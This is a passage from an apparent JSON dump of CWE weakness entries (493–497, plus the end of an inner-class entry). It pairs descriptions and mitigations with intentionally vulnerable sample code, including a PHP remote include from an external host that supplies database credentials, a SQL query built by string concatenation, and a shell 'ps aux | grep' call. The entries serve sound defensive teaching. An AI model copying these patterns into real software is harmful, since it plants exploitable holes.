balance;\n\t\t\t\n\t\t\t\n\t\t\t *// constructor for BankAccount class* \n\t\t\tpublic BankAccount(String accountOwnerName, String accountOwnerSSN,\n\t\t\tint accountNumber, double initialBalance, int initialRate)\n\t\t\t{\n\t\t\t```\n\t\t\t\tthis.accountOwnerName = accountOwnerName;\n\t\t\t\tthis.accountOwnerSSN = accountOwnerSSN;\n\t\t\t\tthis.accountNumber = accountNumber;\n\t\t\t\tthis.balance = initialBalance;\n\t\t\t\tthis.start(initialRate);\n\t\t\t}\n```\n// start method will add interest to balance every 30 days* \n\t\t\t\n\t\t\t\n\t\t\t *// creates timer object and interest adding action listener object* \n\t\t\tpublic void start(final double rate)\n\t\t\t{\n\t\t\t```\n```\n// InterestAdder is a local inner class* \n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t *// that implements the ActionListener interface* \n\t\t\t\t\tclass InterestAdder implements ActionListener\n\t\t\t\t\t{\n\t\t\t\t\t```\n\t\t\t\t\t\t\tpublic void actionPerformed(ActionEvent event)\n\t\t\t\t\t\t\t{\n```\n// update interest* \n\t\t\t\t\t\t\t\t\tdouble interest = BankAccount.this.balance * rate / 100;\n\t\t\t\t\t\t\t\t\tBankAccount.this.balance += interest;}}\n\t\t\t\t\tActionListener adder = new InterestAdder();\n\t\t\t\t\tTimer t = new Timer(1000 * 3600 * 24 * 30, adder);\n\t\t\t\t\tt.start();}}"}, {"BodyText": "A similar approach would be to use an anonymous inner class as demonstrated in the next example. An anonymous inner class is declared without a name and creates only a single instance of the inner class object. As in the previous example the anonymous inner class has its scope restricted to the start method of the BankAccount class."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic class BankAccount {\n```\n// private member variables of BankAccount class* \n\t\t\tprivate String accountOwnerName;\n\t\t\tprivate String accountOwnerSSN;\n\t\t\tprivate int accountNumber;\n\t\t\tprivate double balance;\n\t\t\t\n\t\t\t\n\t\t\t *// constructor for BankAccount class* \n\t\t\tpublic BankAccount(String accountOwnerName, String accountOwnerSSN,\n\t\t\tint accountNumber, double initialBalance, int initialRate)\n\t\t\t{\n\t\t\t```\n\t\t\t\tthis.accountOwnerName = accountOwnerName;\n\t\t\t\tthis.accountOwnerSSN = accountOwnerSSN;\n\t\t\t\tthis.accountNumber = accountNumber;\n\t\t\t\tthis.balance = initialBalance;\n\t\t\t\tthis.start(initialRate);\n\t\t\t}\n```\n// start method will add interest to balance every 30 days* \n\t\t\t\n\t\t\t\n\t\t\t *// creates timer object and interest adding action listener object* \n\t\t\tpublic void start(final double rate)\n\t\t\t{\n\t\t\t```\n```\n// anonymous inner class that implements the ActionListener interface* \n\t\t\t\t\tActionListener adder = new ActionListener()\n\t\t\t\t\t{\n\t\t\t\t\t```\n\t\t\t\t\t\t\tpublic void actionPerformed(ActionEvent event)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t double interest = BankAccount.this.balance * rate / 100; \n\t\t\t\t\t\t\t\t\tBankAccount.this.balance += interest;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t};\n\t\t\t\t\tTimer t = new Timer(1000 * 3600 * 24 * 30, adder);\n\t\t\t\t\tt.start();\n\t\t\t}\n\t}\n```"}]}, {"Entries": [{"IntroText": "In the following Java example a simple applet provides the capability for a user to input a URL into a text field and have the URL opened in a new browser window. The applet contains an inner class that is an action listener for the submit button, when the user clicks the submit button the inner class action listener's actionPerformed method will open the URL entered into the text field in a new browser window. As with the previous examples using inner classes in this manner creates a security risk by exposing private variables and methods. Inner classes create an additional security risk with applets as applets are executed on a remote machine through a web browser within the same JVM and therefore may run side-by-side with other potentially malicious code."}, {"Nature": "Bad", "ExampleCode": "```\n\tpublic class UrlToolApplet extends Applet {\n```\n// private member variables for applet components* \n\t\t\tprivate Label enterUrlLabel;\n\t\t\tprivate TextField enterUrlTextField;\n\t\t\tprivate Button submitButton;\n\t\t\t\n\t\t\t\n\t\t\t *// init method that adds components to applet* \n\t\t\t\n\t\t\t\n\t\t\t *// and creates button listener object* \n\t\t\tpublic void init() {\n\t\t\t```\n\t\t\t\tsetLayout(new FlowLayout());\n\t\t\t\tenterUrlLabel = new Label(\"Enter URL: \");\n\t\t\t\tenterUrlTextField = new TextField(\"\", 20);\n\t\t\t\tsubmitButton = new Button(\"Submit\");\n\t\t\t\tadd(enterUrlLabel);\n\t\t\t\tadd(enterUrlTextField);\n\t\t\t\tadd(submitButton);\n\t\t\t\tActionListener submitButtonListener = new SubmitButtonListener();\n\t\t\t\tsubmitButton.addActionListener(submitButtonListener);\n\t\t\t}\n```\n// button listener inner class for UrlToolApplet class* \n\t\t\tprivate class SubmitButtonListener implements ActionListener {\n\t\t\t```\n\t\t\t\t\tpublic void actionPerformed(ActionEvent evt) {\n\t\t\t\t\t\t\tif (evt.getSource() == submitButton) {\n\t\t\t\t\t\t\t\tString urlString = enterUrlTextField.getText();\n\t\t\t\t\t\t\t\tURL url = null;\n\t\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\t\turl = new URL(urlString);\n\t\t\t\t\t\t\t\t} catch (MalformedURLException e) {\n\t\t\t\t\t\t\t\t\tSystem.err.println(\"Malformed URL: \" + urlString);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif (url != null) {\n\t\t\t\t\t\t\t\t\tgetAppletContext().showDocument(url);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t}\n\t}\n```"}, {"BodyText": "As with the previous examples a solution to this problem would be to use a static inner class, a local inner class or an anonymous inner class. An alternative solution would be to have the applet implement the action listener rather than using it as an inner class as shown in the following example."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic class UrlToolApplet extends Applet implements ActionListener {\n```\n// private member variables for applet components* \n\t\t\tprivate Label enterUrlLabel;\n\t\t\tprivate TextField enterUrlTextField;\n\t\t\tprivate Button submitButton;\n\t\t\t\n\t\t\t\n\t\t\t *// init method that adds components to applet* \n\t\t\tpublic void init() {\n\t\t\t```\n\t\t\t\tsetLayout(new FlowLayout());\n\t\t\t\tenterUrlLabel = new Label(\"Enter URL: \");\n\t\t\t\tenterUrlTextField = new TextField(\"\", 20);\n\t\t\t\tsubmitButton = new Button(\"Submit\");\n\t\t\t\tadd(enterUrlLabel);\n\t\t\t\tadd(enterUrlTextField);\n\t\t\t\tadd(submitButton);\n\t\t\t\tsubmitButton.addActionListener(this);\n\t\t\t}\n```\n// implementation of actionPerformed method of ActionListener interface* \n\t\t\tpublic void actionPerformed(ActionEvent evt) {\n\t\t\t```\n\t\t\t\t\tif (evt.getSource() == submitButton) {\n\t\t\t\t\t\tString urlString = enterUrlTextField.getText();\n\t\t\t\t\t\tURL url = null;\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\turl = new URL(urlString);\n\t\t\t\t\t\t} catch (MalformedURLException e) {\n\t\t\t\t\t\t\tSystem.err.println(\"Malformed URL: \" + urlString);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif (url != null) {\n\t\t\t\t\t\t\tgetAppletContext().showDocument(url);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t}\n\t}\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Other", "Note": "Mobile code, in this case a Java Applet, is code that is transmitted across a network and executed on a remote machine. Because mobile code developers have little if any control of the environment in which their code will execute, special security concerns become relevant. One of the biggest environmental threats results from the risk that the mobile code will run side-by-side with other, potentially malicious, mobile code. Because all of the popular web browsers execute code from multiple sources together in the same JVM, many of the security guidelines for mobile code are focused on preventing manipulation of your objects' state and behavior by adversaries who have access to the same virtual machine where your program is running."}]}
{"ID": "493", "Name": "Critical Public Variable Without Final Modifier", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The product has a critical public variable that is not final, which allows the variable to be modified to contain unexpected values.", "ExtendedDescription": "If a field is non-final and public, it can be changed once the value is set by any function that has access to the class which contains the field. This could lead to a vulnerability if other parts of the program make assumptions about the contents of that field.", "LikelihoodOfExploit": "High", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "668", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C++", "Prevalence": "Undetermined"}], "BackgroundDetails": ["Mobile code, such as a Java Applet, is code that is transmitted across a network and executed on a remote machine. Because mobile code developers have little if any control of the environment in which their code will execute, special security concerns become relevant. One of the biggest environmental threats results from the risk that the mobile code will run side-by-side with other, potentially malicious, mobile code. Because all of the popular web browsers execute code from multiple sources together in the same JVM, many of the security guidelines for mobile code are focused on preventing manipulation of your objects' state and behavior by adversaries who have access to the same virtual machine where your program is running.", "Final provides security by only allowing non-mutable objects to be changed after being set. However, only objects which are not extended can be made final."], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Modify Application Data"], "Note": "The object could potentially be tampered with."}, {"Scope": ["Confidentiality"], "Impact": ["Read Application Data"], "Note": "The object could potentially allow the object to be read."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Declare all public fields as final when possible, especially if it is used to maintain internal state of an Applet or of classes used by an Applet. If a field must be public, then perform all appropriate sanity checks before accessing the field from your code."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "Suppose this WidgetData class is used for an e-commerce web site. The programmer attempts to prevent price-tampering attacks by setting the price of the widget using the constructor."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic final class WidgetData extends Applet {\n\t\tpublic float price;\n\t\t...\n\t\tpublic WidgetData(...) {\n\t\t\tthis.price = LookupPrice(\"MyWidgetType\");\n\t\t}\n\t}\n```"}, {"BodyText": "The price field is not final. Even though the value is set by the constructor, it could be modified by anybody that has access to an instance of WidgetData."}]}, {"Entries": [{"IntroText": "Assume the following code is intended to provide the location of a configuration file that controls execution of the application."}, {"Nature": "Bad", "Language": "C++", "ExampleCode": "```\n\tpublic string configPath = \"/etc/application/config.dat\";\n```"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic String configPath = new String(\"/etc/application/config.dat\");\n```"}, {"BodyText": "While this field is readable from any function, and thus might allow an information leak of a pathname, a more serious problem is that it can be changed by any function."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "494", "Name": "Download of Code Without Integrity Check", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product downloads source code or an executable from a remote location and executes the code without sufficiently verifying the origin and integrity of the code.", "ExtendedDescription": "An attacker can execute malicious code by compromising the host server, performing DNS spoofing, or modifying the code in transit.", "LikelihoodOfExploit": "Medium", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "345", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "669", "ViewID": "1000"}, {"Nature": "ChildOf", "CweID": "669", "ViewID": "1003", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity", "Availability", "Confidentiality", "Other"], "Impact": ["Execute Unauthorized Code or Commands", "Alter Execution Logic", "Other"], "Note": "Executing untrusted code could compromise the control flow of the program. The untrusted code could execute attacker-controlled commands, read or modify sensitive resources, or prevent the software from functioning correctly for legitimate users."}], "DetectionMethods": [{"DetectionMethodID": "DM-7.4", "Method": "Manual Analysis", "Description": "\n\nThis weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.\n\n\nSpecifically, manual static analysis is typically required to find the behavior that triggers the download of code, and to determine whether integrity-checking methods are in use.\n", "EffectivenessNotes": "These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."}, {"DetectionMethodID": "DM-11", "Method": "Black Box", "Description": "\n\nUse monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.\n\n\nAttach the monitor to the process and also sniff the network connection. Trigger features related to product updates or plugin installation, which is likely to force a code download. Monitor when files are downloaded and separately executed, or if they are otherwise read back into the process. Look for evidence of cryptographic library calls that use integrity checking.\n"}, {"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"MitigationID": "MIT-42", "Phase": ["Implementation"], "Description": "Perform proper forward and reverse DNS lookups to detect DNS spoofing.", "EffectivenessNotes": "This is only a partial solution since it will not prevent your code from being modified on the hosting site or in transit."}, {"Phase": ["Architecture and Design", "Operation"], "Description": "\n\nEncrypt the code with a reliable encryption scheme before transmitting.\n\n\nThis will only be a partial solution, since it will not detect DNS spoofing and it will not prevent your code from being modified on the hosting site.\n"}, {"MitigationID": "MIT-4", "Phase": ["Architecture and Design"], "Strategy": "Libraries or Frameworks", "Description": "\n\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nSpeficially, it may be helpful to use tools or frameworks to perform integrity checking on the transmitted code.\n\n\n  - When providing the code that is to be downloaded, such as for automatic updates of the software, then use cryptographic signatures for the code and modify the download clients to verify the signatures. Ensure that the implementation does not contain CWE-295, CWE-320, CWE-347, and related weaknesses.\n\n  - Use code signing technologies such as Authenticode. See references [REF-454] [REF-455] [REF-456].\n\n"}, {"MitigationID": "MIT-17", "Phase": ["Architecture and Design", "Operation"], "Strategy": "Environment Hardening", "Description": "Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."}, {"MitigationID": "MIT-22", "Phase": ["Architecture and Design", "Operation"], "Strategy": "Sandbox or Jail", "Description": "\n\nRun the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.\n\n\nOS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.\n\n\nThis may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.\n\n\nBe careful to avoid CWE-243 and other weaknesses related to jails.\n", "Effectiveness": "Limited", "EffectivenessNotes": "The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "This example loads an external class from a local subdirectory."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tURL[] classURLs= new URL[]{\n\t\tnew URL(\"file:subdir/\")\n\t};\n\tURLClassLoader loader = new URLClassLoader(classURLs);\n\tClass loadedClass = Class.forName(\"loadMe\", true, loader);\n```"}, {"BodyText": "This code does not ensure that the class loaded is the intended one, for example by verifying the class's checksum. An attacker may be able to modify the class file to execute malicious code."}]}, {"ID": "DX-219", "Entries": [{"IntroText": "This code includes an external script to get database credentials, then authenticates a user against the database, allowing access to the application."}, {"Nature": "Bad", "Language": "PHP", "ExampleCode": "```\n```\n//assume the password is already encrypted, avoiding CWE-312* \n\t\n\tfunction authenticate($username,$password){\n\t```\n\t\tinclude(\"http://external.example.com/dbInfo.php\");\n```\n//dbInfo.php makes $dbhost, $dbuser, $dbpass, $dbname available* \n\t\tmysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');\n\t\tmysql_select_db($dbname);\n\t\t$query = 'Select * from users where username='.$username.' And password='.$password;\n\t\t$result = mysql_query($query);\n\t\t\n\t\tif(mysql_numrows($result) == 1){\n\t\t```\n\t\t\tmysql_close();\n\t\t\treturn true;\n\t\t}\n\t\telse{\n\t\t\tmysql_close();\n\t\t\treturn false;\n\t\t}\n\t}\n```"}, {"BodyText": "This code does not verify that the external domain accessed is the intended one. An attacker may somehow cause the external domain name to resolve to an attack server, which would provide the information for a false database. The attacker may then steal the usernames and encrypted passwords from real user login attempts, or simply allow themself to access the application without a real user account."}, {"BodyText": "This example is also vulnerable to an Adversary-in-the-Middle AITM (CWE-300) attack."}]}], "ObservedExamples": [{"Reference": "CVE-2019-9534", "Description": "Satellite phone does not validate its firmware image.", "Link": "https://www.cve.org/CVERecord?id=CVE-2019-9534"}, {"Reference": "CVE-2021-22909", "Description": "Chain: router's firmware update procedure uses curl with \"-k\" (insecure) option that disables certificate validation (CWE-295), allowing adversary-in-the-middle (AITM) compromise with a malicious firmware image (CWE-494).", "Link": "https://www.cve.org/CVERecord?id=CVE-2021-22909"}, {"Reference": "CVE-2008-3438", "Description": "OS does not verify authenticity of its own updates.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3438"}, {"Reference": "CVE-2008-3324", "Description": "online poker client does not verify authenticity of its own updates.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3324"}, {"Reference": "CVE-2001-1125", "Description": "anti-virus product does not verify automatic updates for itself.", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1125"}, {"Reference": "CVE-2002-0671", "Description": "VOIP phone downloads applications from web sites without verifying integrity.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0671"}], "RelatedAttackPatterns": ["184", "185", "186", "187", "533", "538", "657", "662", "691", "692", "693", "695"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Research Gap", "Note": "This is critical for mobile code, but it is likely to become more and more common as developers continue to adopt automated, network-based product distributions and upgrades. Software-as-a-Service (SaaS) might introduce additional subtleties. Common exploitation scenarios may include ad server compromises and bad upgrades."}], "Top25Examples": [{"Reference": "CVE-2021-44168", "Description": "A download of code without integrity check vulnerability in the \"execute restore src-vis\" command of FortiOS before 7.0.3 may allow a local authenticated attacker to download arbitrary files on the device via specially crafted update packages."}]}
{"ID": "495", "Name": "Private Data Structure Returned From A Public Method", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The product has a method that is declared public, but returns a reference to a private data structure, which could then be modified in unexpected ways.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "664", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C++", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C#", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Modify Application Data"], "Note": "The contents of the data structure can be modified from outside the intended scope."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Declare the method private."}, {"Phase": ["Implementation"], "Description": "Clone the member data and keep an unmodified version of the data private to the object."}, {"Phase": ["Implementation"], "Description": "Use public setter methods that govern how a private member can be modified."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "Here, a public method in a Java class returns a reference to a private array. Given that arrays in Java are mutable, any modifications made to the returned reference would be reflected in the original private array."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tprivate String[] colors;\n\tpublic String[] getColors() {\n\t\treturn colors;\n\t}\n```"}]}, {"Entries": [{"IntroText": "In this example, the Color class defines functions that return non-const references to private members (an array type and an integer type), which are then arbitrarily altered from outside the control of the class."}, {"Nature": "Bad", "Language": "C++", "ExampleCode": "```\n\tclass Color\n\t{\n\t\tprivate:\n\t\t\tint[2] colorArray;\n\t\t\tint colorValue;\n\t\tpublic:\n\t\t\tColor () : colorArray { 1, 2 }, colorValue (3) { };\n\t\t\tint[2] & fa () { return colorArray; } \n```\n// return reference to private array* \n\t\t\tint & fv () { return colorValue; } \n\t\t\t *// return reference to private integer* };\n\t\n\tint main ()\n\t{\n\t```\n\t\tColor c;\n\t\tc.fa () [1] = 42; \n```\n// modifies private array element* \n\t\tc.fv () = 42; \n\t\t *// modifies private int* \n\t\t\n\t\treturn 0;}"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "496", "Name": "Public Data Assigned to Private Array-Typed Field", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "Assigning public data to a private array is equivalent to giving public access to the array.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "664", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C++", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C#", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Modify Application Data"], "Note": "The contents of the array can be modified from outside the intended scope."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Do not allow objects to modify private members of a class."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "In the example below, the setRoles() method assigns a publically-controllable array to a private field, thus allowing the caller to modify the private array directly by virtue of the fact that arrays in Java are mutable."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tprivate String[] userRoles;\n\tpublic void setUserRoles(String[] userRoles) {\n\t\tthis.userRoles = userRoles;\n\t}\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "497", "Name": "Exposure of Sensitive System Information to an Unauthorized Control Sphere", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product does not properly prevent sensitive system-level information from being accessed by unauthorized actors who do not have the same level of access to the underlying system as the product does.", "ExtendedDescription": "\n\nNetwork-based products, such as web applications, often run on top of an operating system or similar environment. When the product communicates with outside parties, details about the underlying system are expected to remain hidden, such as path names for data files, other OS users, installed packages, the application environment, etc. This system information may be provided by the product itself, or buried within diagnostic or debugging messages. Debugging information helps an adversary learn about the system and form an attack plan.\n\n\nAn information exposure occurs when system data or debugging information leaves the program through an output stream or logging function that makes it accessible to unauthorized parties. Using other weaknesses, an attacker could cause errors to occur; the response to these errors can reveal detailed system information, along with other impacts. An attacker can use messages that reveal technologies, operating systems, and product versions to tune the attack against known vulnerabilities in these technologies. A product may use diagnostic methods that provide significant implementation details such as stack traces as part of its error handling mechanism.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "200", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design", "Implementation"], "Description": "Production applications should never use methods that generate internal details such as stack traces and error messages unless that information is directly committed to a log that is not viewable by the end user. All error message text should be HTML entity encoded before being written to the log file to protect against potential cross-site scripting attacks against the viewer of the logs"}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following code prints the path environment variable to the standard error stream:"}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tchar* path = getenv(\"PATH\");\n\t...\n\tsprintf(stderr, \"cannot find exe on path %s\\n\", path);\n```"}]}, {"ID": "DX-68", "Entries": [{"IntroText": "This code prints all of the running processes belonging to the current user."}, {"Nature": "Bad", "Language": "PHP", "ExampleCode": "```\n```\n//assume getCurrentUser() returns a username that is guaranteed to be alphanumeric (avoiding CWE-78)* \n\t$userName = getCurrentUser();\n\t$command = 'ps aux | grep ' . $userName;\n\tsystem($command);"}, {"BodyText": "If invoked by an unauthorized web user, it is providing a web page of potentially sensitive information on the underlying system, such as command-line arguments (CWE-497). This program is also potentially vulnerable to a PATH based attack (CWE-426), as an attacker may be able to create malicious versions of the ps or grep commands. While the program does not explicitly raise privileges to run the system commands, the PHP interpreter may by default be running with higher privileges than users."}]}, {"Entries": [{"IntroText": "The following code prints an exception to the standard error stream:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\ttry {\n\t\t...\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n```"}, {"Nature": "Bad", "ExampleCode": "```\n\ttry {\n\t\t...\n\t} catch (Exception e) {\n\t\tConsole.Writeline(e);\n\t}\n```"}, {"BodyText": "Depending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system will be vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the search path could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program."}]}, {"Entries": [{"IntroText": "The following code constructs a database connection string, uses it to create a new connection to the database, and prints it to the console."}, {"Nature": "Bad", "Language": "C#", "ExampleCode": "```\n\tstring cs=\"database=northwind; server=mySQLServer...\";\n\tSqlConnection conn=new SqlConnection(cs);\n\t...\n\tConsole.Writeline(cs);\n```"}, {"BodyText": "Depending on the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the search path could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program."}]}], "ObservedExamples": [{"Reference": "CVE-2021-32638", "Description": "Code analysis product passes access tokens as a command-line parameter or through an environment variable, making them visible to other processes via the ps command.", "Link": "https://www.cve.org/CVERecord?id=CVE-2021-32638"}], "RelatedAttackPatterns": ["170", "694"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of 